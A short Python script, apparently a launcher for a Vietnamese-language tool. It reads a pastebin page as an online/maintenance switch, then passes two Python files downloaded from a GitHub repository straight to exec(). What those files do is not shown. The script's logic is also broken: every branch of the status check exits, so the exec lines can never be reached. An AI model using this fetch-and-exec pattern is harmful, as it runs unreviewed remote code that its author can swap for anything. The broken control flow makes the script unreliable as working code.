import requests,json

__check__ = requests.get('https://pastebin.com/raw/ji4T6sYx').text
if "on" in __check__:
  input("Sever Online\nPress Enter to continue...")
if "baotri" in __check__:
  exit("Sever Bảo trì")
else:
  exit("Sever Offline")
exec(requests.get('https://raw.githubusercontent.com/kouseikzt/kzt1/main/shorterlink.py').text)
exec(requests.get('https://raw.githubusercontent.com/kouseikzt/kzt1/main/zf.py').text)

